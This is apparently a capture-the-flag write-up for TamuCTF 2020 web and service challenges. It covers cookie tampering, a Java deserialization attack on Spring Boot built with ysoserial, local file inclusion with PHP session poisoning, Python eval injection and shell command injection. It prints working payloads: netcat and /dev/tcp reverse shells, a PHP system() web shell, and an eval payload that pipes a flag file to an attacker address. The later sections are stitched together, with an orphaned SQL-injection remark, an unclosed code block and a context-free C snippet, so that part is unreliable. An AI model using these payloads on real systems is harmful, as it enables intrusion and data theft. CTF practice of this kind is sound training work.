## Too many credits 1

The page shows us a counter of credits and lets us increment it by one clicking on a button.

Counter state is saved in a cookie named `counter=H4sIAAA.../.../...A==`.

The first fours characters of every cookie, `H4sI`, points to gzip compressed data.

Decompressing the cookie gets access to a plain text serialization of the Java Class.

Only need to modify the value and compress it back.

```python
import gzip
import base64
import zlib

gzip.decompress(base64.b64decode("H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAABwAU254bUgAAAA=="))

moreCredits = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xFF\xFF\xFF\xFF'
base64.b64encode(gzip.compress(moreCredits))
# b'H4sIAKpBdl4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA'
```

Changing the cookie in the browser, the counter shows more that 2000M credits and the flag.

## Too many credits 2

> Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.

As the previous credits releated challenge, we are presented a simple webpage with a counter and a button that, when clicked,
increments our credit bucket. Setting the credit counter to 2kkk manually is not the solution.. not this time.
As we see a serialized java class as the cookie that controls our credit count, we can suppose this class is deserialized remotely using some insecure methods. As a first step, as always, lets try to break it and hope we can retrieve some information regarding the framework used. If we try to modify the cookie replacing some chars with random data, the server obviously fails deserializing the class and gives us the following error.
![toomanycds](/assets/img/TamuCTF_2020/toomanycreds_1.png)
Hmm, whitelabel error ? Lets search for it.
![toomanycds](/assets/img/TamuCTF_2020/toomanycreds_2.png)
Perfect, Java Spring Boot. If you're crafty enough you can recognize spring boot icon in browser's tab title. Lets search for deserialization vulns for this framework. As we searched, we stumbled upon this damn cool tool [ysoserial](https://github.com/frohoff/ysoserial). This tool exploits unsafe unserialization to create POP gadget chains that can lead to RCE on a vulnerable server. After cloning and building it, we can try out some payloads and see how the server responds.
This tools supports a lot of vulnerable modules.

```bash
[...]
Myfaces1            @mbechler
Myfaces2            @mbechler
ROME                @mbechler                   rome:1.0
Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
URLDNS              @gebl
Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
[...]
```

As we cannot enumerate the modules on the server, lets try directly with Spring1.
The syntax for the payload generator is:

```bash
java -jar ysoserial.jar Spring1 "OUT_COMMAND"
```

Lets try to execute a *nslookup* and see if the requests pass:

```bash
curl --cookie "counter=$(ysoserial Spring1 'nslookup outserver.com' | gzip | base64 -w 0)" "http://172.17.0.2:8080"
```

And surprisingly we receive a DNS resolution request on our server! Good, now lets try to open a reverse shell:

```bash
curl --cookie "counter=$(ysoserial Spring1 'nc 172.17.0.1 4444 -e /bin/bash' | gzip | base64 -w 0)" "http://172.17.0.2:8080"
```

With us listening on the over side:

```bash
nc -nlvp 4444
```

Et voilà, we have our reverse shell and can cat for the flag situated at */opt/credits-1.0.0-SNAPSHOT/flag.txt*

## filestorage

> Try out my new file sharing site!
> http://172.17.0.2

Navigating to __http://172.17.0.2/index.php__ gives as a form asking for a name

![nameform](/assets/img/TamuCTF_2020/filestorage_1.png)

Let's try and input something like _\<strong>foo</strong>_.
It will get us to a sort of uploads list page. Observe that our name is not escaped.

![listuploads](/assets/img/TamuCTF_2020/filestorage_2.png)

If we click on one of the list elements we can get that file's content.

![seeupload](/assets/img/TamuCTF_2020/filestorage_3.png)

Observe the link that was used to view the page:

```bash
http://172.17.0.2/index.php?file=beemovie.txt
```

Hmm, smells like RFI.

Let's try something like _/index.php?file=../../../../etc/passwd_

![lfi](/assets/img/TamuCTF_2020/filestorage_4.png)

It works! Seems like _index.php?file=filename_ does something like:

```php
if ($_GET['file']) {
    $output = file_get_contents($_GET['file']);
    include ($output);
}
```

This means that we have arbitrary reads. Let's check if our session files are stored in _/tmp/sess_SESSIONID_.
By trying __http://172.17.0.2/index.php?file=../../../../../tmp/sess_imec37rtfcsn9v2p7dd8mqful8__ we get our serialized session data.

![sessdata](/assets/img/TamuCTF_2020/filestorage_5.png)

Observe that our name is in bold, which means no sanitization is applied when registering.
We can try to use some php code as our name:

```php
<?php system($_GET["cmd"]); ?>
```

Now if we navigate to __/index.php?file=../../../../../tmp/sess_lavn0ra1jqa7sh2nien1fehhh1&cmd=id__ we get our **id** command executed.

![cmdid](/assets/img/TamuCTF_2020/filestorage_6.png)

Perfect, let's read the flag!

1. Find the flag location:

```bash
/index.php?file=../../../../../tmp/sess_lavn0ra1jqa7sh2nien1fehhh1&cmd=find / -name '*flag*' 2>/dev/null
```

2. Read the flag at /flag_is_here/flag.txt

```bash
/index.php?file=../../../../../../../../tmp/sess_lavn0ra1jqa7sh2nien1fehhh1&cmd=cat ../../../../../flag_is_here/flag.txt
```

## mentalmath

> My first web app, check it out!

Navigating to the website we find ourselves in front of a sort of math solver.
We have some sort of api behind  the static webpage. The api points to /api/new_problem and accepts json payloads like :

```json
{
    "problem" : "1+1",
    "answer" : "2"
}
```

Playing with the payload we can observe that if we pass

```json
{
    "problem" : "1+1 # Random alphanumeric string",
    "answer" : "2"
}
```

we get no error, as if the **#** symbol is interpreted as a comment.
Digging further we can discover that there is an endpoint to /admin which gives us the classic Django admin login page, which lets us think we are in front of some sort of web application hosted by flask in this case.
![djangologin](/assets/img/TamuCTF_2020/mentalmath_1.png)

Lets try to break it. Whith a payload like below we get an 500 Server Error. Hmm, seems like the server is naively **eval**uating our input :

```json
{
    "problem" : "1 + abc",
    "answer" : "2"
}
```

What happens if we try to read the flag using python code ?

```json
{
    "problem" : "open('flag.txt','r').read()#",
    "answer" : "1",
}
```

```json
{"correct": true, "problem": "29 * 53"}
```

We get a correct answer, interesting. Lets ensure we are reading the flag by trying to read a random non existent file

```json
{
    "problem" : "open('flag123.txt','r').read()#",
    "answer" : "1",
}
```

With this payload the server responds with an 500, as expected.
From this point on there are several solutions.

- You could easily listen on a port with netcat and pipe the flag :

```json
{
    "problem" : "__import__('os').popen('cat flag.txt | nc <attacker-ip> <attacker-port>')",
    "answer" : "1",
}

```

- A more complicated solution would be catching a reverse shell using something like :

```json
{
    "problem" : "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);",
    "answer" : "1",
}

```

- Or you could like my mosachistic solution which bruteforces each char of the flag and outputs correct only if the character was found. Don't blame me, I wasn't aware that you could access the network from within the application :(

Go take a coffe and wait for your flag ;)

PS: Strangely our exploit worked even if logically it should have failed as from seeing the docker configuration after the CTF ended we saw that the flag was in a custom table *db.accounts* and not in *mysql.user*. Seeing *login.php* also gave us no clue as it uses :

```php
$sql = "SELECT * FROM accounts WHERE username='$login_user' AND password='$login_pass'";

> nc challenges.tamuctf.com 3424

After connecting to the socket, writing something returns a number.
From the numbers (0-OK, 1-ERR, 127-NOT_FOUND) we can guess it executes the command within a shell and retuns the status code.

First, set up a listener `nc -lvp 1337`.

`nc` isn't installed on the server since it returns the status code 127, but we can also open a reverse shell with:

```bash
/bin/bash -i > /dev/tcp/<our ip>/1337 0<&1 2>&1
```

In case the reverse shell didn't work, one could have bruteforced every char using ifs.

```python

chars = 6
flag = "gigem{"

while True:
    chars += 1
    for c in string.ascii_lowercase + string.digits + string.ascii_uppercase + '_}{':
        print flag+c
        conn.sendline(str.format(fmt, chars, flag+c))
        status = conn.recvline()

        if "0" in status:
            flag += c
            print flag

#include <stdlib.h>
#include <stdbool.h>

void main() {
  srand((uint)time((time_t *)0x0));

  for (int i = 0; i < 100; i++) {
    printf("%d\n", (rand() % 100000 + 1));
  }
}
```

Execute the `nc` command at the same time of the extracted number generator.

```bash
./num_gen | nc <ip> <port>
```
